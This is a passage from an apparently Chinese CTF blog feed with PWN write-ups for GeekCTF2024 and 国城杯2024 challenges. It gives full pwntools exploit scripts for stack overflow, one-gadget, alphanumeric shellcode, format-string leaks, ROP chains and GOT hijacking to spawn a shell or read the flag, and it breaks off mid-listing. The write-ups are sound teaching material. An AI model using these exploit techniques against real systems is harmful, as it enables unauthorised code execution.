libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p32(stack)+p32(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>从下载附件到打通题目再到写完文章，一天过去了……之前没有试过这么少资料能参考的情况，网上的wp甚至只能找到<a href="https://deepunk.icu/GeekCTF2024wp/">DeePunk师傅的</a>（orz师傅tql），尽管是一道简单的栈溢出，却也要花这么多的时间才能较为完整地学习下来基础知识。实际做下来其实发现并没有那么困难，很多知识都可以迁移和类比，大概时间都花在了搭环境上。无论如何，能坚持写完这篇文章感觉真是不容易。希望我明天、后天、大后天也能有这么饱满的热情去学习新知识。</p><p>2025年的GeekCTF，会赢吗？</p><h2 id="深入探究"><a href="#深入探究" class="headerlink" title="深入探究"></a>深入探究</h2><p>更新：2024.12.13</p><p>临近期末，但是一点都不想准备。有点和这个hexagon杠上了，然后发现这个动态链接库中有ogg利用的可能性。</p><p>我们在IDA中搜索&#x2F;bin&#x2F;sh，可以看到有三个函数引用到这个字符串。以system函数举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000BBA70                 &#123; r3 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BBA74                 &#123; r0 = add(pc, ##aSh@pcrel) &#125; // &quot;sh&quot;</span><br><span class="line">.text:000BBA7C                 &#123; memw(fp + #var_420) = r0 &#125;</span><br><span class="line">.text:000BBA80                 &#123; r0 = add(pc, ##aC_0@pcrel) &#125; // &quot;-c&quot;</span><br><span class="line">.text:000BBA88                 &#123; memw(fp + #var_41C) = r0 &#125;</span><br><span class="line">.text:000BBA8C                 &#123; r0 = memw(fp + #var_10) &#125;</span><br><span class="line">.text:000BBA90                 &#123; memw(fp + #var_418) = r0 &#125;</span><br><span class="line">.text:000BBA94                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BBA98                 &#123; memw(fp + #var_414) = r2 &#125;</span><br><span class="line">.text:000BBA9C                 &#123; r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) &#125;</span><br><span class="line">.text:000BBAA4                 &#123; r0 = memw(r0 + ##-0x102E8) &#125;</span><br><span class="line">.text:000BBAAC                 &#123; r5 = memw(r0) &#125;</span><br><span class="line">.text:000BBAB0                 &#123; r1 = add(pc, ##aBinSh@pcrel) &#125; // &quot;/bin/sh&quot;</span><br><span class="line">.text:000BBAB8                 &#123; r0 = add(fp, #-0x14) &#125;</span><br><span class="line">.text:000BBABC                 &#123; r4 = add(fp, #-0x420) &#125;</span><br><span class="line">.text:000BBAC0                 &#123; call posix_spawn &#125;</span><br></pre></td></tr></table></figure><p>这里取了一小部分，也就是找到的类似于ogg的位置。实际上正常system执行，会从r0寄存器接受函数参数，也就是我们想执行的命令。这个命令的地址会被储存到fp-0x10的位置。通过上面的汇编我们也不难发现，这里最后执行的是<code>posix_spawn</code>函数，这个函数的签名如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">posix_spawn</span><span class="params">(<span class="type">pid_t</span> *<span class="keyword">restrict</span> pid, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> path, <span class="type">const</span> <span class="type">posix_spawn_file_actions_t</span> *file_actions, <span class="type">const</span> <span class="type">posix_spawnattr_t</span> *<span class="keyword">restrict</span> attrp, <span class="type">char</span> *<span class="type">const</span> argv[<span class="keyword">restrict</span>], <span class="type">char</span> *<span class="type">const</span> envp[<span class="keyword">restrict</span>])</span>;</span><br></pre></td></tr></table></figure><ul><li><code>pid</code>: 指向存储新进程 ID 的指针。</li><li><code>path</code>: 要执行的程序的路径。</li><li><code>file_actions</code>: 文件操作对象，用于指定子进程的文件描述符操作。可以是 <code>NULL</code>。</li><li><code>attrp</code>: 进程属性对象，用于指定子进程的调度和信号处理等属性。可以是 <code>NULL</code>。</li><li><code>argv</code>: 程序的参数列表（类似 <code>exec</code> 系列函数）。</li><li><code>envp</code>: 环境变量列表（类似 <code>exec</code> 系列函数）。</li></ul><p>第五个参数是我们要关注的，这个参数由r4寄存器传参。在上面的ogg中，r4被赋值为fp-0x420。其中fp-0x418处的值来自于fp-0x10。即，我们只要将传入的命令的储存地址，放到fp-0x10的位置上，这个ogg就能成功生效执行一个shell。</p><p>因此这道题的payload可以写成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(stack)*(<span class="number">0x100</span>//<span class="number">4</span>-<span class="number">1</span>) + \</span><br><span class="line">    p32(stack+<span class="number">0x100</span>)+p32(libc_base+<span class="number">0xBBA70</span>)</span><br></pre></td></tr></table></figure><p>不需要任何其他的gadget和寄存器操作。但是不同于glibc的ogg，这里利用还是需要传入命令参数的。换个角度想，我们可以利用这一点做到RCE。</p>]]></content>
      
      
      <categories>
          
          <category> hexagon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> hexagon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『国城杯2024』PWN WP</title>
      <link href="/2024/2024GCBCTF-wp/"/>
      <url>/2024/2024GCBCTF-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h2><p>这题应该是除了签到外全场第一个一血，我抢了个三血。纯血可见字符shellcode题。main函数了塞了一些花指令（jn+jnz），没法直接反编译，部分IDA版本不受影响，我当时用8.3是需要nop掉之后，再create function才能正常反编译。</p><p>开了沙箱：<img src="https://c-lby.top/images/2024GCBCTF/%E6%B2%99%E7%AE%B1.png" alt="沙箱"></p><p>考虑openat+sendfile</p><p>可以注意到程序在执行shellcode的时候是基于rdx，所以使用ae64生成的时候要改参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(sc, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = AE64().encode(payload, <span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h2><h3 id="前段分析"><a href="#前段分析" class="headerlink" title="前段分析"></a>前段分析</h3><p>首先题目主程序中的函数全部来自动态链接库，附件给出了额外自定义的.so，我们真正需要分析的是这个动态库。login函数贴脸fmt漏洞，可以泄露出登录密码。这里有两种做法，一个是用%s泄露密码，一个是用%ln覆写密码。</p><p>接下来程序开了个多线程，一个可以修改认证密码，一个需要你写正确的认证密码。没有线程互斥锁，二分之一几率修改认证密码的线程会先出现，然后再输入和刚才一样的认证密码就行。</p><h3 id="后段分析"><a href="#后段分析" class="headerlink" title="后段分析"></a>后段分析</h3><h4 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h4><p>接下来就进入到了最难蚌的地方。我们现在有一个很大的栈溢出，但是没有libc地址。这里先讲第一种做法，注意到主程序没开PIE，其中调用了printer函数，这个函数可以打开文件并输出文件内容，不难想到只要给rdi传入”flag”字符串地址就能打印flag了。但问题在于没法调用read。注意到主程序给了一些gadget，考虑出题人想要我们利用这些gadget来构造flag字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040064E fungadgets:</span><br><span class="line">.text:000000000040064E                 xlat</span><br><span class="line">.text:000000000040064F                 retn</span><br><span class="line">.text:0000000000400650 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400650                 pop     rdx</span><br><span class="line">.text:0000000000400651                 pop     rcx</span><br><span class="line">.text:0000000000400652                 add     rcx, 0D093h</span><br><span class="line">.text:0000000000400659                 bextr   rbx, rcx, rdx</span><br><span class="line">.text:000000000040065E                 retn</span><br><span class="line">.text:000000000040065F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040065F                 stosb</span><br><span class="line">.text:0000000000400660                 retn</span><br><span class="line">.text:0000000000400661 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400661                 pop     rdi</span><br><span class="line">.text:0000000000400662                 retn</span><br><span class="line">.text:0000000000400662 _text           ends</span><br></pre></td></tr></table></figure><p>这里有些很冷门的汇编指令：</p><ul><li>xlat(Translate Byte to AL)：在x86_64下的作用是查找[bx+al]的内容，并将其储存在al中</li><li>bextr(Bit Field Extract)：bextr   rbx, rcx, rdx的作用是将rcx+dh开始的dl长度的数据，放到rbx中。注意不是取[rcx+dh]，而是rcx寄存器本身的内容。</li><li>stosb(Store String Byte)：将al寄存器中的数据储存到[rdi]当中，并rdi++或–（取决与DF标志寄存器）</li></ul><p>程序中不存在完整的“flag”字符串，那么我们需要逐个字节去寻找字符，并将字符连续放到bss段当中。分为以下几步：</p><ol><li>查找某个字符在主程序的地址，将这个地址减去0xD093后传入rcx</li><li>将rdx设置为0x4000，意味着取这个rcx的内容</li><li>执行bextr，此时rbx等于rcx</li><li>执行xlat，此时rax的值是第一步查找到的字符</li><li>将rdi赋值为bss段地址</li><li>执行stosb，此时rax中的字符就会被传入到bss地址中</li></ol><p>这里需要注意几个问题，我们需要连续查找六个字符（.&#x2F;flag），但是途中rax寄存器会因为上一个字符而残留一些数据，会影响到下一个字符的xlat指令执行。因为在第二个字符开始，我们传入rbx的地址要考虑到上一个字符的影响。</p><h5 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h5><p>下面通过动调举例看看执行情况。payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(bss)+p64(bextr) + \</span><br><span class="line">    p64(<span class="number">0x4000</span>)+p64(<span class="number">0x3F2F83</span>)+p64(xlat)+p64(stosb)<span class="comment">#0x3F2F83=0x400016-0xd093</span></span><br></pre></td></tr></table></figure><p>这个程序动调需要注意多线程问题，pwndbg启动之后虽然程序停在等待输入，但是当前他可能在另一个线程，不在read的线程。这时候需要通过<code>thread 2</code>切换到2线程，这样断点之类的才不会飞。进入到rop链，此时rcx被赋值为0x400016</p><p><img src="https://c-lby.top/images/2024GCBCTF/rcx%E8%A2%AB%E8%B5%8B%E5%80%BC.png" alt="rcx被赋值"></p><p>bextr执行过后，rbx被赋值。现在我们要查找的字符就是<code>.</code>所以能看到该地址指向的第一个字符就是<code>.</code></p><p><img src="https://c-lby.top/images/2024GCBCTF/rbx%E8%A2%AB%E8%B5%8B%E5%80%BC.png" alt="rbx被赋值"></p><p>xlat执行过后：</p><p><img src="https://c-lby.top/images/2024GCBCTF/xlat%E6%89%A7%E8%A1%8C%E8%BF%87%E5%90%8E.png" alt="xlat执行过后"></p><p>可以看到原本rax是0的，现在是0x2e。执行完stosb，这个0x2e就会进到0x600300中。后面的字符以此类推。需要注意的就是，这个rax不会自己置零，所以下一个字符的地址不仅要减0xd093，还要减去0x2e，以此类推。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;125.70.243.22&quot;, 31307)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(<span class="string">b&#x27;%7$sflag&#x27;</span>+p64(<span class="number">0x6002B0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">password = r.recv(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(password)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b shell&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x600300</span></span><br><span class="line">xlat = <span class="number">0x40064E</span></span><br><span class="line">stosb = <span class="number">0x40065F</span></span><br><span class="line">rdi = <span class="number">0x400661</span></span><br><span class="line">bextr = <span class="number">0x400650</span></span><br><span class="line">printer = <span class="number">0x400647</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(bss)+p64(bextr) + \</span><br><span class="line">    p64(<span class="number">0x4000</span>)+p64(<span class="number">0x3F2F83</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x4000</span>)+p64(<span class="number">0x400006</span> -</span><br><span class="line">                                      <span class="number">0xD093</span>-<span class="number">0x2e</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x40023f</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x2f</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x400001</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x66</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x4001f8</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x6c</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x4001ea</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x61</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(rdi)+p64(bss)+p64(printer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这个exp里的地址都是手搜出来的。也可以用官方wp的写法，利用<code>next(elf.search(bytes([char])))</code>的方法自动搜索字符地址，一把梭。</p><h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>还记得前面的16字节fmt吗？如果用泄露密码的方式来绕过login，那么我们还能多出来4个字节的位置，可以拿来泄露libc地址。这样的话栈溢出就直接getshell就好了，不知道是不是非预期解。当然前提是在4个字节里能够泄露得出来，这道题刚好可以，在寄存器里有一个libc地址。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;125.70.243.22&quot;, 31307)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(<span class="string">b&#x27;%3$p%7$s&#x27;</span>+p64(<span class="number">0x6002B0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)-<span class="number">0x114887</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">password = r.recv(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(password)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400661</span></span><br><span class="line">ret = <span class="number">0x400462</span></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>checkvip函数随机数绕过老生常谈，给了libc2.35，直接ctypes刷脸就行。不过这道题甚至不需要刷脸，可以注意到buf可以输入16个字节，随后被复制到了name变量，在bss段，会把seed也一起覆盖了，因此可以直接固定种子，不需要调用time函数。</p><p>buy函数没有限制v0不能小于0，因此利用read，可以修改got表（没开relro和PIE保护）。注意到vuln函数有个<code>printf(&quot;/bin/sh&quot;)</code>，考虑将printf的got表劫持为system。</p><p>在这之前我们需要先泄露libc地址，同样是利用got表，但是只有一次机会，所以要先想办法循环一下。考虑劫持exit为buy函数。</p><p>因此总体思路如下：</p><ol><li>劫持exit@got为buy函数</li><li>选择一个没被劫持但已解析的got地址泄露libc</li><li>劫持printf@got为system函数</li><li>劫持exit@got为vuln函数</li></ol><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">srand = libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;125.70.243.22&quot;</span>,<span class="number">31382</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input yours id authentication code:&quot;</span>,<span class="built_in">str</span>(libc.rand()))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0x40133f</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;succeed\n&quot;</span>)</span><br><span class="line">libcaddr=u64(p.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=libcaddr-<span class="number">0x0815f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcaddr&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system=libcbase+<span class="number">0x050d70</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x401484&quot;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0x401515</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h2><p>2.23版本堆题，有UAF和edit函数堆溢出，几乎就是随便打。看到vtable还以为是什么新型IO题，结果看到这道题解出人数哐哐上升。</p><p>这里直接套UAF板子来打了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 